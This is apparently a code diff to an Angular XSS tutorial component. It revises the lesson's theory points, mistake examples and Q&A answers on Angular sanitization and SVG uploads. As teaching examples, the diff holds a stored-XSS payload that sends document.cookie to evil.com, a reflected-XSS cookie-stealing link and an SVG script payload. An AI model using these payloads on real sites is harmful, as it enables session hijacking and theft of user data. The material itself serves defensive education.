@@ -24,8 +24,8 @@ const theory: TheoryPoint[] = [
   {
     heading: 'XSS Attack Types',
     points: [
-      'Stored XSS: attacker submits `<script>document.location=\'https://evil.com/steal?\'+document.cookie</script>` as a comment. The server stores it and serves it to every user who views that page.',
-      'Reflected XSS: attacker sends victim a link like `https://bank.com/search?q=<script>stealCookies()</script>`. The server includes the `q` value in the response HTML without escaping.',
+      'Stored XSS: attacker submits <code>&lt;script&gt;document.location=\'https://evil.com/steal?\'+document.cookie&lt;/script&gt;</code> as a comment. The server stores it and serves it to every user who views that page.',
+      'Reflected XSS: attacker sends victim a link like <code>https://bank.com/search?q=&lt;script&gt;stealCookies()&lt;/script&gt;</code>. The server includes the <code>q</code> value in the response HTML without escaping.',
       'DOM XSS: client-side JavaScript reads `location.hash` or `location.search` and writes it to `innerHTML` or `document.write` — the script runs in the victim\'s browser without hitting the server.',
       'Impact: cookie theft (session hijacking), keylogging, credential phishing overlays, cryptocurrency mining, redirecting users to malicious sites.',
     ],
@@ -33,7 +33,7 @@ const theory: TheoryPoint[] = [
   {
     heading: 'Primary Defenses',
     points: [
-      'Output encoding: HTML-encode all user-controlled data before inserting into HTML context. `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`. Context matters: HTML body, HTML attribute, JS string, and URL each require different encoding.',
+      'Output encoding: HTML-encode all user-controlled data before inserting into HTML context — `&`, `<`, `>`, and `"` each become their own named HTML entity (see the Output Encoding code tab for the exact entity names). Context matters: HTML body, HTML attribute, JS string, and URL each require different encoding.',
       'Use safe APIs: `element.textContent = userInput` (safe) vs `element.innerHTML = userInput` (dangerous). React, Angular, and Vue escape by default — do not use `dangerouslySetInnerHTML` or `[innerHTML]` with user input.',
       'Content Security Policy (CSP): HTTP header `Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-abc123\'` — browsers refuse to execute inline scripts and scripts from unlisted sources.',
       'HttpOnly cookies: mark session cookies `HttpOnly` — JavaScript cannot read them even if XSS executes. Reduces impact of cookie theft.',
@@ -51,7 +51,7 @@ const theory: TheoryPoint[] = [
   {
     heading: 'Framework-Specific Protections',
     points: [
-      'Angular: template binding `{{ userInput }}` is safe — Angular escapes HTML. `[innerHTML]="userInput"` is dangerous — Angular does NOT sanitize it by default (it will strip scripts but not all XSS vectors). Use `DomSanitizer.sanitizeHtml()` if truly needed.',
+      'Angular: template binding `{{ userInput }}` is safe — Angular escapes HTML. `[innerHTML]="userInput"` IS sanitized by default too — Angular strips <code>&lt;script&gt;</code> tags, event-handler attributes (`onerror`, `onclick`, `onload`), and `javascript:` URLs before inserting the value. The real danger is `DomSanitizer.bypassSecurityTrustHtml()`, which explicitly disables that sanitization — never call it on untrusted user content.',
       'React: JSX `{userInput}` is safe. `dangerouslySetInnerHTML={{ __html: userInput }}` is dangerous — use DOMPurify if you must render user HTML.',
       'Server-side rendering: escape output in templates. Handlebars `{{userInput}}` escapes; `{{{userInput}}}` does not. Same pattern in Jinja2, EJS, Razor.',
     ],
@@ -161,14 +161,14 @@ element.innerHTML = DOMPurify.sanitize(userComment);`,
     explanation: '`innerHTML` parses the string as HTML and executes any scripts or event handlers. `textContent` treats the string as literal text — special characters are automatically escaped. Always prefer `textContent`; use DOMPurify when you genuinely need to render HTML.',
   },
   {
-    title: 'Using Angular [innerHTML] without sanitization',
-    wrong: `<!-- Angular doesn't sanitize [innerHTML] against all XSS vectors -->
-<div [innerHTML]="userContent"></div>`,
-    right: `<!-- Option 1: display as text (safest) -->
-<div>{{ userContent }}</div>
-<!-- Option 2: sanitize first if HTML is needed -->
+    title: 'Calling bypassSecurityTrustHtml() on untrusted user content',
+    wrong: `<!-- bypassSecurityTrustHtml() explicitly disables Angular's own sanitizer -->
+<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userContent)"></div>`,
+    right: `<!-- Plain [innerHTML] is already sanitized by Angular -- safe as-is -->
+<div [innerHTML]="userContent"></div>
+<!-- Only bypass if Angular's sanitizer strips content you've verified is safe -->
 <div [innerHTML]="sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(userContent))"></div>`,
-    explanation: 'Angular\'s `[innerHTML]` does strip `<script>` tags but does not sanitize all XSS vectors (e.g., `<img onerror=...>`). Use `{{ }}` binding for text, or sanitize with DOMPurify before passing to `bypassSecurityTrustHtml`.',
+    explanation: 'Angular already sanitizes `[innerHTML]` bindings by default — it strips `<script>` tags and `on*` event-handler attributes. `bypassSecurityTrustHtml()` exists to tell Angular "trust this string completely," which disables that protection outright. Calling it on untrusted user content, not plain `[innerHTML]` binding, is the actual mistake.',
   },
   {
     title: 'CSP with unsafe-inline — negates script protection',
@@ -255,10 +255,10 @@ const qna: QnaItem[] = [
   },
   {
     q: 'Does Angular automatically protect against XSS?',
-    a: 'Angular\'s template binding <code>{{ value }}</code> and property bindings like <code>[textContent]="value"</code> are safe — Angular escapes HTML. However, <code>[innerHTML]="value"</code> is dangerous: Angular does strip <code>&lt;script&gt;</code> tags but does NOT sanitize all XSS vectors. Never use <code>[innerHTML]</code> with untrusted user content without first passing it through DOMPurify. Angular\'s <code>bypassSecurityTrustHtml()</code> is explicitly for cases where you KNOW the HTML is safe — it bypasses all sanitization.',
+    a: 'Angular\'s template binding <code>{{ value }}</code> and property bindings like <code>[textContent]="value"</code> are safe — Angular escapes HTML. <code>[innerHTML]="value"</code> is ALSO sanitized by default: Angular strips <code>&lt;script&gt;</code> tags, dangerous event-handler attributes (<code>onerror</code>, <code>onclick</code>, <code>onload</code>), and <code>javascript:</code> URLs before inserting the value. The real danger is <code>DomSanitizer.bypassSecurityTrustHtml()</code> — it exists to tell Angular "trust this string completely," which disables sanitization outright. Never call it on untrusted user content; if Angular\'s sanitizer strips HTML you\'ve verified is safe, sanitize with DOMPurify first, then bypass Angular\'s now-redundant check.',
   },
   { q: 'How do you prevent XSS in an Angular application?', a: 'Angular XSS protection: built-in sanitization: Angular automatically sanitizes values bound to DOM properties. Template binding {{ userInput }} escapes HTML entities. [innerHTML] binding sanitizes the HTML using Angular DomSanitizer. Angular marks HTML as safe only after sanitization. Security risk patterns: using DomSanitizer.bypassSecurityTrustHtml() bypasses sanitization — only use for known-safe HTML from trusted sources. Using ElementRef.nativeElement.innerHTML directly bypasses Angular sanitization. Using document.write() or eval() with untrusted data. Safe patterns: never call bypassSecurityTrustHtml() with user-supplied content. Use Angular template binding for all user data. If rich text is needed, sanitize with DOMPurify before passing to bypassSecurityTrustHtml(). Content Security Policy: set a strict CSP as a defense in depth. Angular applications use nonce-based CSP for inline styles and scripts.' },
-  { q: 'What is XSS via SVG and what makes SVG uploads particularly dangerous?', a: 'SVG (Scalable Vector Graphics) files are XML-based and can contain embedded JavaScript: <svg xmlns=http://www.w3.org/2000/svg><script>alert(document.cookie)</script></svg>. When a user uploads an SVG file and the application displays it as an image with Content-Type: image/svg+xml, the browser renders it as HTML, executing the embedded script. Browsers do NOT execute JavaScript in SVG when the Content-Type is image/png or image/jpeg, but SVG is special. Attack surface: profile picture uploads. Document sharing platforms. Icon or logo upload features. Mitigations: serve SVG files from a separate origin with a restrictive CSP and no user cookies. Sanitize SVG content server-side before storing (remove script elements and event handlers using an SVG sanitizer). Convert SVG to PNG on upload if SVG is not needed. Set X-Content-Type-Options: nosniff to prevent MIME sniffing, but this does not help if the Content-Type is correctly set to image/svg+xml.' },
+  { q: 'What is XSS via SVG and what makes SVG uploads particularly dangerous?', a: 'SVG (Scalable Vector Graphics) files are XML-based and can contain embedded JavaScript: <code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/svg&gt;</code>. Whether the browser executes that script depends on the RENDERING CONTEXT, not just the Content-Type header: displayed via <code>&lt;img src="upload.svg"&gt;</code>, the image-rendering context suppresses script execution completely — the embedded script never runs. Opened via direct navigation (a link straight to the file URL), or embedded via <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, or <code>&lt;iframe&gt;</code>, the browser treats it as an active XML document and DOES execute the script. Attack surface: any "view full size" or "download" link that navigates straight to the stored file, or an embed widget using object/iframe — not a plain avatar <code>&lt;img&gt;</code> tag by itself. Mitigations: serve SVG files from a separate, cookieless origin with a restrictive CSP (script-src none). Sanitize SVG content server-side before storing (remove script elements and event handlers using an SVG-aware sanitizer). Convert SVG to PNG on upload if SVG is not needed. Set Content-Disposition: attachment on the direct file-serving route so navigating to it prompts a download instead of rendering it inline.' },
   { q: 'What is mutation XSS (mXSS) and why is it a challenge for sanitizers?', a: 'Mutation XSS: HTML sanitizers parse and clean HTML, but the browser re-parses the sanitized HTML and produces a different DOM (due to HTML parser quirks). The re-parsed DOM contains XSS payloads that the sanitizer thought it removed. Example: the sanitizer allows table elements and removes script. A crafted input exploits the difference between how the sanitizer parses and how the browser parses, causing the sanitizer to see safe HTML while the browser produces executable script. Historical mXSS attacks: nested HTML comments that confuse parsers. Malformed HTML entities that sanitizers do not decode but browsers do. CDATA sections parsed differently in HTML vs SVG vs MathML namespaces. Mitigations: use mature, actively maintained sanitizers (DOMPurify has extensive mXSS protection). Keep sanitizer libraries updated. After sanitization, have the sanitizer re-parse the output to verify no XSS survived (DOMPurify does this with inner serialization).' },
   { q: 'How should you sanitize HTML in a rich text editor feature?', a: 'Rich text editor XSS prevention: the challenge: rich text editors (Quill, TipTap, ProseMirror) allow users to create formatted content with HTML structure. The application must store and render this HTML, creating XSS risk. Server-side sanitization: use a robust HTML sanitizer server-side before storing: DOMPurify (JavaScript/Node.js). Bleach (Python). HtmlSanitizer (.NET). Configure the sanitizer with a strict allowlist: allowed tags (p, strong, em, ul, li, a, h1-h6, br, blockquote). Allowed attributes (a href — validate URL scheme, style — restrict to safe properties). Prohibited: script, object, iframe, embed, form, input. Prohibited attributes: onload, onerror, onclick, and all event handlers. Client-side sanitization as defense in depth: sanitize before display using DOMPurify in the browser. Use a CSP to limit what scripts can run. URL validation: in href attributes, allow only http:// and https:// (block javascript: URLs).' },
 ];
@@ -293,3 +293,4 @@ export class SecXss {
   quickRef = quickRef; theory = theory; codeTabs = codeTabs;
   mistakes = mistakes; challenge = challenge; quiz = quiz; qna = qna; revision = revision;
 }
+
